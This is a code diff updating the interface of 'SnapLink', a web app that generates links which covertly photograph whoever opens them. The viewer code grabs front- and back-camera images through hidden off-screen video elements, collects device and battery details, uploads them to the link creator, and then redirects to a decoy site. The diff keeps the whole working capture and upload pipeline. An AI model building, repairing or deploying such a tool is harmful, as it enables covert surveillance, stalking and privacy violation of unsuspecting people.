@@ -2,76 +2,361 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SnapLink – Share & Capture</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>SnapLink</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200" rel="stylesheet" />
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Inter', system-ui, sans-serif; background:#0b0d12; color:#eef2f6; padding:20px; }
-        .container { max-width:800px; margin:0 auto; background:#151a22; border-radius:28px; padding:32px; border:1px solid #2a313c; }
-        h1 { font-size:28px; background:linear-gradient(135deg,#f0f4ff,#8ab4f8); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
-        .sub { color:#8895aa; margin-bottom:24px; }
-        input, textarea, button { width:100%; padding:12px 16px; background:#1e2632; border:1px solid #2e3848; border-radius:12px; color:#f0f4ff; font-size:15px; }
-        input:focus, textarea:focus { border-color:#4d8bf7; box-shadow:0 0 0 3px rgba(77,139,247,0.2); }
-        .btn { background:#2f6ed4; border:none; font-weight:600; cursor:pointer; transition:0.2s; }
-        .btn:hover { background:#3d7ce6; transform:translateY(-1px); }
-        .btn-secondary { background:#252f3e; }
-        .btn-success { background:#1f8b4c; }
-        .link-card { background:#1a222e; border-radius:16px; padding:16px; margin:16px 0; border:1px solid #2a3444; }
-        .capture-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-top:12px; }
-        .capture-item { background:#11171f; border-radius:12px; padding:10px; }
-        .capture-item img { width:100%; border-radius:8px; }
-        .capture-meta { font-size:12px; color:#8899b0; margin-top:4px; }
-        .toast { padding:12px; border-radius:12px; background:#1f2a3a; border-left:4px solid #4d8bf7; margin:10px 0; display:none; }
-        .toast.show { display:block; }
-        .loader { text-align:center; padding:20px; }
-        .spinner { width:50px; height:50px; border:5px solid #1e2a3a; border-top-color:#4d8bf7; border-radius:50%; animation:spin 0.9s linear infinite; margin:0 auto 12px; }
-        @keyframes spin { to { transform:rotate(360deg); } }
-        .hidden { display:none; }
+        body {
+            font-family: 'Inter', system-ui, sans-serif;
+            background: #0e0e12;
+            color: #e6e6ed;
+            min-height: 100vh;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+        #app {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+            background: #14141b;
+            min-height: 100vh;
+            position: relative;
+            padding-bottom: 80px;
+        }
+        .app-bar {
+            display: flex;
+            align-items: center;
+            padding: 16px 20px 8px;
+            background: #14141b;
+            position: sticky;
+            top:0;
+            z-index: 10;
+            border-bottom: 1px solid #2a2a33;
+        }
+        .app-bar h1 {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: -0.3px;
+            background: linear-gradient(135deg, #b3c7ff, #7b9aff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .app-bar .spacer { flex:1; }
+        .app-bar .material-symbols-outlined {
+            font-size: 28px;
+            color: #b3c7ff;
+        }
+        .tab-content {
+            flex: 1;
+            padding: 12px 16px 20px;
+            display: none;
+            animation: fadeIn 0.25s ease;
+        }
+        .tab-content.active { display: block; }
+        @keyframes fadeIn {
+            from { opacity:0.5; transform:translateY(6px); }
+            to { opacity:1; transform:translateY(0); }
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            max-width: 600px;
+            width: 100%;
+            background: #1c1c26;
+            display: flex;
+            border-top: 1px solid #2a2a33;
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            z-index: 20;
+            padding: 6px 0 env(safe-area-inset-bottom);
+        }
+        .bottom-nav button {
+            flex: 1;
+            background: transparent;
+            border: none;
+            color: #8a8a99;
+            font-size: 12px;
+            font-weight: 500;
+            padding: 8px 0 4px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 2px;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+        }
+        .bottom-nav button .material-symbols-outlined { font-size: 28px; transition: 0.2s; }
+        .bottom-nav button span:last-child { font-size: 11px; }
+        .bottom-nav button.active { color: #b3c7ff; }
+        .bottom-nav button.active .material-symbols-outlined { font-variation-settings: 'FILL' 1; }
+
+        .card {
+            background: #1e1e29;
+            border-radius: 20px;
+            padding: 20px;
+            margin-bottom: 16px;
+            border: 1px solid #2a2a36;
+        }
+        .card-title { font-size: 16px; font-weight: 600; margin-bottom: 8px; color: #e6e6ed; }
+        .card-sub { font-size: 13px; color: #8a8a99; margin-bottom: 16px; }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-top: 8px;
+        }
+        .input-group input {
+            background: #111118;
+            border: 1px solid #2a2a36;
+            border-radius: 16px;
+            padding: 14px 18px;
+            color: #e6e6ed;
+            font-size: 15px;
+            font-family: inherit;
+            outline: none;
+            transition: 0.2s;
+            width: 100%;
+        }
+        .input-group input:focus {
+            border-color: #7b9aff;
+            box-shadow: 0 0 0 3px rgba(123,154,255,0.15);
+        }
+        .btn {
+            background: #3a5ce0;
+            border: none;
+            border-radius: 20px;
+            padding: 14px 24px;
+            font-weight: 600;
+            font-size: 15px;
+            color: white;
+            cursor: pointer;
+            transition: 0.2s;
+            font-family: inherit;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        .btn:hover { background: #4b6ee6; }
+        .btn:active { transform: scale(0.96); }
+        .btn-secondary { background: #2a2a36; color: #b3c7ff; }
+        .btn-secondary:hover { background: #3a3a4a; }
+
+        .link-box {
+            display: flex;
+            gap: 8px;
+            align-items: center;
+            background: #111118;
+            border-radius: 16px;
+            padding: 4px 4px 4px 18px;
+            margin-top: 8px;
+        }
+        .link-box input {
+            flex:1;
+            background: transparent;
+            border: none;
+            color: #c6c6d6;
+            font-size: 14px;
+            padding: 12px 0;
+            outline: none;
+            min-width: 0;
+        }
+        .link-box .btn { padding: 10px 18px; font-size: 13px; border-radius: 14px; }
+
+        .toast {
+            padding: 12px 16px;
+            border-radius: 16px;
+            background: #1a1a26;
+            border-left: 4px solid #7b9aff;
+            margin: 12px 0 0;
+            display: none;
+            font-size: 14px;
+            color: #c6c6d6;
+        }
+        .toast.show { display: block; }
+        .toast.error { border-left-color: #f25a5a; background: #261a1a; color: #f5baba; }
+        .toast.success { border-left-color: #3dcd7a; background: #14281e; color: #b0e8c8; }
+
+        .link-item {
+            background: #1a1a26;
+            border-radius: 18px;
+            padding: 16px;
+            margin-bottom: 14px;
+            border: 1px solid #2a2a36;
+        }
+        .link-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 6px;
+        }
+        .link-header strong { font-size: 15px; font-weight: 600; color: #d6d6e6; }
+        .link-header .badge {
+            font-size: 12px;
+            color: #8a8a99;
+            background: #2a2a36;
+            padding: 4px 12px;
+            border-radius: 40px;
+        }
+        .link-meta { font-size: 12px; color: #6a6a7a; margin-bottom: 12px; }
+        .capture-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .capture-item {
+            background: #111118;
+            border-radius: 14px;
+            padding: 10px;
+        }
+        .capture-item img { width: 100%; border-radius: 10px; display: block; }
+        .capture-meta {
+            font-size: 11px;
+            color: #8a8a99;
+            margin-top: 6px;
+            line-height: 1.4;
+        }
+        .empty-state {
+            text-align: center;
+            color: #6a6a7a;
+            padding: 30px 0;
+        }
+        .empty-state .material-symbols-outlined {
+            font-size: 48px;
+            color: #3a3a4a;
+            margin-bottom: 12px;
+        }
+        .viewer-container {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 60vh;
+            text-align: center;
+            padding: 20px;
+        }
+        .viewer-container .spinner {
+            width: 48px;
+            height: 48px;
+            border: 4px solid #2a2a36;
+            border-top: 4px solid #7b9aff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .viewer-container .status {
+            font-size: 16px;
+            color: #b3c7ff;
+            margin-bottom: 8px;
+        }
+        .viewer-container .sub {
+            font-size: 14px;
+            color: #8a8a99;
+        }
+        .step-dots {
+            display: flex;
+            gap: 12px;
+            margin: 20px 0;
+        }
+        .step-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #2a2a36;
+            transition: 0.3s;
+        }
+        .step-dot.active { background: #7b9aff; box-shadow: 0 0 12px rgba(123,154,255,0.3); }
+        .step-dot.done { background: #3dcd7a; }
         video { position:fixed; top:-9999px; left:-9999px; width:1px; height:1px; }
-        .step { display:inline-block; margin:0 4px; font-size:16px; transition:0.3s; color:#2a3444; }
-        .step.active { color:#4d8bf7; font-size:24px; }
-        .step.done { color:#3dcd7a; font-size:20px; }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-<div class="container" id="app">
-    <!-- Dashboard -->
-    <div id="dashboard">
-        <h1>📸 SnapLink</h1>
-        <div class="sub">Create links that capture photos & device data from anyone who opens them.</div>
-        
-        <div style="display:grid; gap:12px; margin-bottom:24px;">
-            <input type="url" id="redirectUrl" placeholder="Redirect URL (e.g. https://example.com)" />
-            <input type="email" id="creatorEmail" placeholder="Your email (optional)" />
-            <button class="btn" id="createBtn">✨ Create Link</button>
-        </div>
+<div id="app">
 
-        <div id="linkResult" class="hidden" style="margin-bottom:20px;">
-            <div class="link-card" style="display:flex; gap:12px; align-items:center; flex-wrap:wrap;">
-                <input type="text" id="generatedLink" readonly style="flex:1; background:transparent; border:none; padding:8px 0;" />
-                <button class="btn btn-secondary" id="copyBtn" style="width:auto; padding:8px 20px;">Copy</button>
+    <!-- Top App Bar -->
+    <div class="app-bar">
+        <h1>SnapLink</h1>
+        <div class="spacer"></div>
+        <span class="material-symbols-outlined">auto_awesome</span>
+    </div>
+
+    <!-- Tab: Create -->
+    <div id="tab-create" class="tab-content active">
+        <div class="card">
+            <div class="card-title">Create a new link</div>
+            <div class="card-sub">Anyone who opens it will capture two photos.</div>
+            <div class="input-group">
+                <input type="url" id="redirectUrl" placeholder="Redirect URL (e.g. https://example.com)" />
+                <input type="email" id="creatorEmail" placeholder="Your email (optional)" />
+                <button class="btn" id="createBtn">
+                    <span class="material-symbols-outlined">add_link</span> Generate Link
+                </button>
             </div>
-            <div id="createToast" class="toast"></div>
+            <div id="linkResult" class="hidden" style="margin-top:16px;">
+                <div class="link-box">
+                    <input type="text" id="generatedLink" readonly />
+                    <button class="btn btn-secondary" id="copyBtn">
+                        <span class="material-symbols-outlined" style="font-size:20px;">content_copy</span>
+                    </button>
+                </div>
+                <div id="createToast" class="toast"></div>
+            </div>
         </div>
 
-        <hr style="border-color:#1f2836; margin:20px 0;" />
+        <div style="font-size:12px; color:#4a4a5a; text-align:center; margin-top:8px;">
+            Up to 4 captures per link · Images hosted on ImgBB
+        </div>
+    </div>
 
-        <h2 style="font-size:20px; margin-bottom:12px;">📋 Your Links</h2>
+    <!-- Tab: Links -->
+    <div id="tab-links" class="tab-content">
+        <div style="margin-bottom:12px;">
+            <span style="font-size:15px; font-weight:500;">Your links</span>
+        </div>
         <div id="linksList"></div>
     </div>
 
-    <!-- Viewer -->
-    <div id="viewer" class="hidden">
-        <div class="loader">
-            <div class="spinner"></div>
-            <p id="viewerStatus">⏳ Preparing…</p>
-            <div style="margin-top:16px; display:flex; gap:8px; justify-content:center;">
-                <span class="step" id="step1">●</span>
-                <span class="step" id="step2">●</span>
-                <span class="step" id="step3">●</span>
-                <span class="step" id="step4">●</span>
+    <!-- Bottom Navigation -->
+    <div class="bottom-nav">
+        <button class="active" data-tab="create">
+            <span class="material-symbols-outlined">add_circle</span>
+            <span>Create</span>
+        </button>
+        <button data-tab="links">
+            <span class="material-symbols-outlined">link</span>
+            <span>Links</span>
+        </button>
+    </div>
+
+    <!-- Viewer Mode (hidden by default) -->
+    <div id="viewer" class="hidden" style="flex:1; display:none; flex-direction:column; justify-content:center; padding:20px;">
+        <div class="viewer-container">
+            <div class="spinner" id="viewerSpinner"></div>
+            <div class="status" id="viewerStatus">Preparing capture…</div>
+            <div class="sub" id="viewerSub">Requesting camera permission</div>
+            <div class="step-dots">
+                <span class="step-dot" id="step1"></span>
+                <span class="step-dot" id="step2"></span>
+                <span class="step-dot" id="step3"></span>
+                <span class="step-dot" id="step4"></span>
             </div>
-            <div id="viewerToast" class="toast" style="margin-top:12px;"></div>
+            <div id="viewerToast" class="toast" style="width:100%;"></div>
         </div>
     </div>
 </div>
@@ -92,8 +377,9 @@ if (!creatorId) {
 }
 
 // ─── DOM refs ───
-const dashboard = document.getElementById('dashboard');
-const viewer = document.getElementById('viewer');
+const tabCreate = document.getElementById('tab-create');
+const tabLinks = document.getElementById('tab-links');
+const navBtns = document.querySelectorAll('.bottom-nav button');
 const redirectUrlInput = document.getElementById('redirectUrl');
 const creatorEmailInput = document.getElementById('creatorEmail');
 const createBtn = document.getElementById('createBtn');
@@ -103,8 +389,11 @@ const copyBtn = document.getElementById('copyBtn');
 const createToast = document.getElementById('createToast');
 const linksList = document.getElementById('linksList');
 
+const viewer = document.getElementById('viewer');
 const viewerStatus = document.getElementById('viewerStatus');
+const viewerSub = document.getElementById('viewerSub');
 const viewerToast = document.getElementById('viewerToast');
+const viewerSpinner = document.getElementById('viewerSpinner');
 const steps = {
     step1: document.getElementById('step1'),
     step2: document.getElementById('step2'),
@@ -115,6 +404,17 @@ const frontVideo = document.getElementById('frontVideo');
 const backVideo = document.getElementById('backVideo');
 const captureCanvas = document.getElementById('captureCanvas');
 
+// ─── Tab Switching ───
+navBtns.forEach(btn => {
+    btn.addEventListener('click', () => {
+        const tab = btn.dataset.tab;
+        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+        document.getElementById('tab-' + tab).classList.add('active');
+        navBtns.forEach(b => b.classList.remove('active'));
+        btn.classList.add('active');
+    });
+});
+
 // ─── Helpers ───
 function showToast(el, msg, type = '') {
     el.textContent = msg;
@@ -123,10 +423,10 @@ function showToast(el, msg, type = '') {
     el._timer = setTimeout(() => el.className = 'toast', 5000);
 }
 
-function setStep(stepId, state) {
-    const el = steps[stepId];
+function setStep(id, state) {
+    const el = steps[id];
     if (!el) return;
-    el.className = 'step ' + state;
+    el.className = 'step-dot ' + state;
 }
 
 async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
@@ -137,11 +437,6 @@ async function collectMetadata() {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
-        languages: navigator.languages,
-        cookieEnabled: navigator.cookieEnabled,
-        doNotTrack: navigator.doNotTrack,
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory || 'unknown',
         screen: `${screen.width}x${screen.height} (${screen.colorDepth}-bit)`,
         timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         browser: (() => {
@@ -168,8 +463,6 @@ async function collectMetadata() {
             meta.battery = {
                 level: battery.level,
                 charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime,
             };
         }
     } catch (_) {}
@@ -177,7 +470,6 @@ async function collectMetadata() {
         meta.connection = {
             type: navigator.connection.effectiveType,
             downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
         };
     }
     return meta;
@@ -194,21 +486,25 @@ async function loadLinks() {
 
 function renderLinks(links) {
     if (!links || links.length === 0) {
-        linksList.innerHTML = '<p style="color:#6a7d96;">No links created yet.</p>';
+        linksList.innerHTML = `
+            <div class="empty-state">
+                <div class="material-symbols-outlined">link_off</div>
+                <div>No links created yet</div>
+            </div>
+        `;
         return;
     }
     let html = '';
     for (const link of links) {
         const captures = link.captures || [];
-        html += `<div class="link-card">
-            <div style="display:flex; justify-content:space-between; flex-wrap:wrap; gap:8px;">
-                <strong style="color:#b0c6e0;">🔗 ${link.linkId}</strong>
-                <span style="color:#6a7d96;font-size:13px;">${captures.length}/4 captures</span>
+        html += `<div class="link-item">
+            <div class="link-header">
+                <strong>${link.linkId}</strong>
+                <span class="badge">${captures.length}/4 captures</span>
             </div>
-            <div style="font-size:13px;color:#6a7d96;word-break:break-all;">Redirects to: ${link.redirectUrl}</div>
-            <div style="font-size:12px;color:#4d6079;margin-top:4px;">Created: ${new Date(link.createdAt).toLocaleString()}</div>`;
+            <div class="link-meta">Redirects to: ${link.redirectUrl} · ${new Date(link.createdAt).toLocaleString()}</div>`;
         if (captures.length === 0) {
-            html += `<div style="color:#4d6079;font-size:13px;margin-top:8px;">No captures yet.</div>`;
+            html += `<div style="color:#6a6a7a;font-size:13px;">No captures yet.</div>`;
         } else {
             html += `<div class="capture-grid">`;
             for (const cap of captures) {
@@ -240,7 +536,7 @@ createBtn.addEventListener('click', async () => {
     const redirectUrl = redirectUrlInput.value.trim();
     const email = creatorEmailInput.value.trim();
     if (!redirectUrl) {
-        showToast(createToast, 'Please enter a redirect URL.', 'error');
+        showToast(createToast, 'Enter a redirect URL.', 'error');
         return;
     }
     try { new URL(redirectUrl); } catch (_) {
@@ -258,7 +554,7 @@ createBtn.addEventListener('click', async () => {
             const fullLink = window.location.origin + window.location.pathname + '?id=' + data.linkId;
             generatedLink.value = fullLink;
             linkResult.classList.remove('hidden');
-            showToast(createToast, '✅ Link created!', 'success');
+            showToast(createToast, 'Link created!', 'success');
             loadLinks();
         } else {
             showToast(createToast, 'Error: ' + (data.error || 'unknown'), 'error');
@@ -270,11 +566,11 @@ createBtn.addEventListener('click', async () => {
 
 copyBtn.addEventListener('click', () => {
     navigator.clipboard.writeText(generatedLink.value).then(() => {
-        showToast(createToast, '📋 Copied!', 'success');
+        showToast(createToast, 'Copied!', 'success');
     }).catch(() => {
         generatedLink.select();
         document.execCommand('copy');
-        showToast(createToast, '📋 Copied!', 'success');
+        showToast(createToast, 'Copied!', 'success');
     });
 });
 
@@ -284,27 +580,33 @@ async function initViewer() {
     const linkId = params.get('id');
     if (!linkId) return false;
 
-    dashboard.classList.add('hidden');
+    // Hide tabs, show viewer
+    document.getElementById('app').querySelector('.app-bar').style.display = 'none';
+    document.querySelector('.bottom-nav').style.display = 'none';
+    document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'none');
     viewer.classList.remove('hidden');
+    viewer.style.display = 'flex';
 
     try {
         const res = await fetch(`${API_BASE}/captures?linkId=${encodeURIComponent(linkId)}`);
         const data = await res.json();
         if (!data.linkExists) {
-            viewerStatus.textContent = '❌ Link not found.';
+            viewerStatus.textContent = 'Link not found';
+            viewerSub.textContent = 'This link may have expired.';
+            viewerSpinner.style.display = 'none';
             return true;
         }
         if (data.capturesCount >= 4) {
-            viewerStatus.textContent = '⛔ This link has reached its 4‑capture limit.';
-            setTimeout(() => {
-                if (data.redirectUrl) window.location.href = data.redirectUrl;
-            }, 3000);
+            viewerStatus.textContent = 'Capture limit reached';
+            viewerSub.textContent = 'This link already has 4 captures.';
+            viewerSpinner.style.display = 'none';
+            setTimeout(() => { window.location.href = data.redirectUrl; }, 3000);
             return true;
         }
         await performCapture(linkId, data.redirectUrl);
     } catch (e) {
-        viewerStatus.textContent = '⚠️ Error: ' + e.message;
-        showToast(viewerToast, 'Error: ' + e.message, 'error');
+        viewerStatus.textContent = 'Error: ' + e.message;
+        viewerSub.textContent = 'Redirecting…';
         await sleep(3000);
         window.location.href = 'https://example.com';
     }
@@ -315,14 +617,16 @@ async function initViewer() {
 async function performCapture(linkId, redirectUrl) {
     try {
         setStep('step1', 'active');
-        viewerStatus.textContent = '📷 Requesting camera permission…';
+        viewerStatus.textContent = 'Requesting camera permission…';
+        viewerSub.textContent = 'Please allow camera access';
         if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
             throw new Error('Camera not supported.');
         }
 
         setStep('step1', 'done');
         setStep('step2', 'active');
-        viewerStatus.textContent = '📸 Capturing front camera…';
+        viewerStatus.textContent = 'Capturing front camera…';
+        viewerSub.textContent = 'Hold still…';
         const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 }, audio: false });
         frontVideo.srcObject = frontStream;
         await frontVideo.play();
@@ -332,7 +636,8 @@ async function performCapture(linkId, redirectUrl) {
         setStep('step2', 'done');
 
         setStep('step3', 'active');
-        viewerStatus.textContent = '📸 Capturing back camera…';
+        viewerStatus.textContent = 'Capturing back camera…';
+        viewerSub.textContent = 'Almost there…';
         const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 }, audio: false });
         backVideo.srcObject = backStream;
         await backVideo.play();
@@ -342,7 +647,8 @@ async function performCapture(linkId, redirectUrl) {
         setStep('step3', 'done');
 
         setStep('step4', 'active');
-        viewerStatus.textContent = '📤 Sending data…';
+        viewerStatus.textContent = 'Uploading…';
+        viewerSub.textContent = 'Sending images';
         const metadata = await collectMetadata();
 
         const formData = new FormData();
@@ -359,13 +665,15 @@ async function performCapture(linkId, redirectUrl) {
         if (!resp.ok) throw new Error(result.error || 'Upload failed');
 
         setStep('step4', 'done');
-        viewerStatus.textContent = '✅ Done! Redirecting…';
+        viewerStatus.textContent = 'Redirecting…';
+        viewerSub.textContent = 'Done!';
         showToast(viewerToast, 'Captured successfully!', 'success');
         await sleep(800);
         window.location.href = redirectUrl;
     } catch (err) {
-        viewerStatus.textContent = '⚠️ ' + err.message;
-        showToast(viewerToast, 'Error: ' + err.message, 'error');
+        viewerStatus.textContent = 'Error: ' + err.message;
+        viewerSub.textContent = 'Redirecting…';
+        showToast(viewerToast, err.message, 'error');
         await sleep(2500);
         window.location.href = redirectUrl;
     }
@@ -396,8 +704,14 @@ function dataURLtoBlob(dataUrl) {
 (async () => {
     const isViewer = await initViewer();
     if (!isViewer) {
-        dashboard.classList.remove('hidden');
-        viewer.classList.add('hidden');
+        // Show dashboard
+        document.getElementById('app').querySelector('.app-bar').style.display = 'flex';
+        document.querySelector('.bottom-nav').style.display = 'flex';
+        document.querySelectorAll('.tab-content').forEach(el => el.style.display = 'block');
+        document.getElementById('tab-create').classList.add('active');
+        document.getElementById('tab-links').classList.remove('active');
+        navBtns.forEach(b => b.classList.remove('active'));
+        document.querySelector('.bottom-nav button[data-tab="create"]').classList.add('active');
         loadLinks();
     }
 })();
